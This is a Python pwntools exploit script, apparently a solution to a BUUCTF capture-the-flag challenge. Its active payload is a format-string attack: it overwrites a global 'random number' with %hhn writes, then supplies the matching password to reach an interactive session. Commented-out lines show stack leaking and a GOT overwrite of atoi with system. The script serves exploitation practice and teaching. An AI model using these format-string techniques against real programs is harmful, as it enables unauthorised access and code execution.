from pwn import *

# node3.buuoj.cn:28087

context.os = "linux"
context.arch = "i386"
# context.log_level = "debug"

elf = ELF("./pwn")

atoi = elf.got["atoi"]
system = elf.plt["system"]
# system = 0x8049080
print(hex(system))

if args.LOCAL:
    p = process("./pwn")
else:
    p = remote("node3.buuoj.cn", 26056)

# use gdb to debug
# printf_fmt = 0x80492b2
# gdb.attach(p, "b printf")

random_num_addr = 0x804c044

# payload = p32(random_num_addr) + b'%10$p'
# payload = b'AAAA%16$n%17$n%18$n%19$n' + p32(random_num_addr) + p32(random_num_addr + 1) + p32(random_num_addr + 2) + p32(random_num_addr + 3)
# payload = p32(random_num_addr) + p32(random_num_addr + 1) + p32(random_num_addr + 2) + p32(random_num_addr + 3) + b'%10$hhn%11$hhn%12$hhn%13$hhn'
payload = b'AAAA%18$hhn%19$hhn%20$hhn%21$hhn' + p32(random_num_addr) + p32(random_num_addr + 1) + p32(random_num_addr + 2) + p32(random_num_addr + 3)

# 使用pwntools的fmtstr_payload()方法
# payload = fmtstr_payload(10, {atoi: system})
# payload = fmtstr_payload(10, {random_num_addr: 0xdeadbeef})
# print(payload)
p.sendlineafter("name:", payload) 
answer = str(0x04040404) # correct
# answer = p32(0x04040404) # wrong
p.sendlineafter("passwd:", answer)

p.interactive()

# p.recvuntil("Hello,")

# random_num = p.recvline()
# print("random: ", random_num)

# # p.sendlineafter("passwd:", p32(random_num))
# # p.sendlineafter("passwd:", str(0x4040404))
# p.interactive()
